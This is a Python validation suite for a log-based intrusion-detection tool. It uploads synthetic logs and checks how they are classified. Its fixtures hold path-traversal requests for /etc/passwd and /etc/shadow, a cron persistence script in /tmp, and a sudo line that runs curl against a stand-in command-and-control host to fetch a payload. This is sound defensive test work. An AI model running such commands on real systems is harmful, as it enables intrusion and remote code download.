"""
test_4_validation_scenarios.py — Automated execution of the 4 validation tests.

Test 1 — Clean Baseline:
    Log with only routine systemd, cron, and NetworkManager.
    Expected: NORMAL status, no attack classification, no automated mitigations.

Test 2 — Traversal Attempt (HTTP 400):
    Log with rejected /../../etc/passwd requests.
    Expected: PATH_TRAVERSAL detection (NOT data exfiltration), HIGH_RISK or SUSPICIOUS.

Test 3 — Suspicious Privilege Escalation:
    Log with unauthorized sudo, root shell spawn (/bin/bash), and suspicious cron persistence.
    Expected: High-risk host-level finding (score >= 65), evidence identifying contributing lines.

Test 4 — Verify Response Actions:
    Inspect code path and runtime outputs of response_engine.py.
    Verify: Simulated application/graph actions (in-memory + Neo4j) vs. real OS firewall/isolation.
"""

import urllib.request
import json
import os
import sys

UPLOAD_URL = "http://127.0.0.1:8001/dataset/upload"

def post_raw_log(filename: str, content: str):
    boundary = b'----TraceShieldBoundary'
    data = content.encode('utf-8')
    body = (
        b'--' + boundary + b'\r\n'
        b'Content-Disposition: form-data; name="file"; filename="' + filename.encode() + b'"\r\n'
        b'Content-Type: text/plain\r\n\r\n'
        + data + b'\r\n'
        b'--' + boundary + b'--\r\n'
    )
    req = urllib.request.Request(
        UPLOAD_URL,
        data=body,
        headers={'Content-Type': 'multipart/form-data; boundary=' + boundary.decode()},
        method='POST'
    )
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read().decode())

def run_tests():
    print("=" * 80)
    print("TRACESHIELD X++ SYSTEMATIC 4-SCENARIO VALIDATION SUITE")
    print("=" * 80)

    # ── TEST 1: CLEAN BASELINE ────────────────────────────────────────────────
    print("\n[TEST 1] Running Clean Baseline Test...")
    clean_log = """Apr 11 01:00:01 ubuntu-server CRON[1001]: (root) CMD (run-parts --report /etc/cron.hourly)
Apr 11 01:00:05 ubuntu-server systemd[1]: Started Session 12 of user admin.
Apr 11 01:00:10 ubuntu-server NetworkManager[800]: <info> device (eth0): state change: activated -> activated
Apr 11 01:00:15 ubuntu-server systemd[1]: Reached target Multi-User System.
Apr 11 01:00:20 ubuntu-server nginx[900]: worker process 900 exited on signal 15
Apr 11 01:00:25 ubuntu-server systemd[1]: Started Daily apt download activities.
Apr 11 01:00:30 ubuntu-server sshguard[600]: Whitelisting address 127.0.0.1: it is localhost
Apr 11 01:00:35 ubuntu-server sudo: mayur : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
"""
    res1 = post_raw_log("test1_clean_baseline.log", clean_log)
    print(f"Summary: {res1['summary']}")
    for r in res1['results']:
        print(f"  source={r['ip']:<15} status={r['status']:<12} score={r['risk_score']:<5} attack_type={r['attack_type']:<18} actions={r['actions']}")
    t1_pass = all(r['status'] == 'NORMAL' and r['attack_type'] == 'NORMAL_ACTIVITY' and len(r['actions']) == 0 for r in res1['results'])
    print(f">> TEST 1 RESULT: {'PASS (Clean baseline preserved, zero false mitigations)' if t1_pass else 'FAIL'}")

    # ── TEST 2: PATH TRAVERSAL ATTEMPT (HTTP 400) ────────────────────────────
    print("\n[TEST 2] Running Path Traversal Attempt (HTTP 400) Test...")
    traversal_log = """Apr 11 01:05:00 ubuntu-server nginx[839]: access: client=198.51.100.42 method=GET path="/../../etc/passwd" status=400
Apr 11 01:05:02 ubuntu-server nginx[839]: access: client=198.51.100.42 method=GET path="/../../etc/shadow" status=400
Apr 11 01:05:05 ubuntu-server nginx[839]: access: client=198.51.100.42 method=GET path="/.env" status=404
Apr 11 01:05:10 ubuntu-server CRON[1002]: (root) CMD (run-parts --report /etc/cron.hourly)
"""
    res2 = post_raw_log("test2_path_traversal.log", traversal_log)
    print(f"Summary: {res2['summary']}")
    target_r2 = next((r for r in res2['results'] if r['ip'] == '198.51.100.42'), None)
    if target_r2:
        print(f"  target=198.51.100.42 status={target_r2['status']} score={target_r2['risk_score']} attack_type={target_r2['attack_type']} actions={target_r2['actions']}")
        t2_pass = (target_r2['status'] in ('HIGH_RISK', 'EXTREME_RISK') and 
                   target_r2['attack_type'] == 'PATH_TRAVERSAL' and 
                   target_r2['attack_type'] != 'DATA_EXFILTRATION')
        print(f">> TEST 2 RESULT: {'PASS (Correctly classified as PATH_TRAVERSAL; does not claim successful exfiltration)' if t2_pass else 'FAIL'}")
    else:
        print(">> TEST 2 RESULT: FAIL (Target IP missing)")

    # ── TEST 3: SUSPICIOUS PRIVILEGE ESCALATION ──────────────────────────────
    print("\n[TEST 3] Running Suspicious Privilege Escalation Test...")
    priv_esc_log = """Apr 11 01:10:00 ubuntu-server sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Apr 11 01:10:05 ubuntu-server CRON[1005]: (www-data) CMD (/tmp/.cache/update.sh)
Apr 11 01:10:10 ubuntu-server sudo: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://c2.invalid/payload
Apr 11 01:10:15 ubuntu-server sudo: pam_unix(sudo:session): session opened for user root by www-data(uid=33)
"""
    res3 = post_raw_log("test3_priv_esc.log", priv_esc_log)
    print(f"Summary: {res3['summary']}")
    host_r3 = next((r for r in res3['results'] if r['ip'] == 'host_system'), None)
    if host_r3:
        evidence = host_r3['features'].get('evidence_lines', [])
        print(f"  target=host_system status={host_r3['status']} score={host_r3['risk_score']} attack_type={host_r3['attack_type']} actions={host_r3['actions']}")
        print(f"  Triggering evidence lines captured: {len(evidence)}")
        for ln in evidence:
            print(f"    • {ln}")
        t3_pass = (host_r3['status'] == 'EXTREME_RISK' and 
                   host_r3['attack_type'] == 'PRIVILEGE_ESCALATION' and 
                   len(evidence) >= 2)
        print(f">> TEST 3 RESULT: {'PASS (High-risk host finding with contributing evidence lines identified)' if t3_pass else 'FAIL'}")
    else:
        print(">> TEST 3 RESULT: FAIL (host_system missing)")

    # ── TEST 4: VERIFY RESPONSE ACTIONS ──────────────────────────────────────
    print("\n[TEST 4] Inspecting Response Actions & Execution Layer...")
    print("Inspecting ingestion/services/response_engine.py implementation:")
    with open("ingestion/services/response_engine.py", "r", encoding="utf-8") as f:
        src = f.read()
    has_simulated_warning = "All actions are simulated (no real network blocking)" in src
    has_blocked_dict = "_blocked:  Dict[str, BlockedEntry]" in src or "_blocked" in src
    has_neo4j_block = "_store_block_in_neo4j" in src
    has_neo4j_hp = "_store_honeypot_in_neo4j" in src
    no_real_iptables = "subprocess.run([\"iptables\"" not in src and "os.system(\"iptables\"" not in src

    print(f"  • Source code disclaimer present: {has_simulated_warning}")
    print(f"  • In-memory block dictionary tracked: {has_blocked_dict}")
    print(f"  • Neo4j graph block persistence implemented: {has_neo4j_block}")
    print(f"  • Neo4j honeypot graph persistence implemented: {has_neo4j_hp}")
    print(f"  • Host kernel iptables commands omitted (safe sandbox): {no_real_iptables}")

    t4_pass = has_simulated_warning and has_blocked_dict and has_neo4j_block and no_real_iptables
    print(f">> TEST 4 RESULT: {'PASS (Application and Graph actions accurately distinguished from kernel firewall)' if t4_pass else 'FAIL'}")

if __name__ == '__main__':
    run_tests()
